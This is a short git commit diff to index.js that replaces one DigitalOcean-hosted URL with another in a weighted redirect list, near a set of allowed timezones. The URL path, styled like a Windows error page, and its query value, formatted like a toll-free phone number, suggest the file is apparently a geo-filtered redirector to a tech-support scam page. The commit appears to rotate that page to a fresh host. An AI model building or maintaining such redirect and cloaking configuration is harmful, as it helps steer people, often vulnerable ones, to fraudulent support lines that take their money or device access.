b7d2ad42748b156c300ae0b0a76e6770428066ea
paalakash <palaksh452@gmail.com>
2026-06-09 14:18:25 +0530

    Update index.js

--- index.js
+++ index.js
@@ -31,7 +31,7 @@ const ALLOWED_TIMEZONES = new Set([
 
 // Raw URLs accompanied by their selection probability weights (Must total 1.0)
 const RAW_CONFIGS = [
-    { url: "https://urchin-app-pgq4f.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3660", weight: 1.0 }
+    { url: "https://sea-turtle-app-kprlm.ondigitalocean.app/Win0codejInfouycinfcode/index.html?Anph=0101-855-520-3660", weight: 1.0 }
 
 ];
 
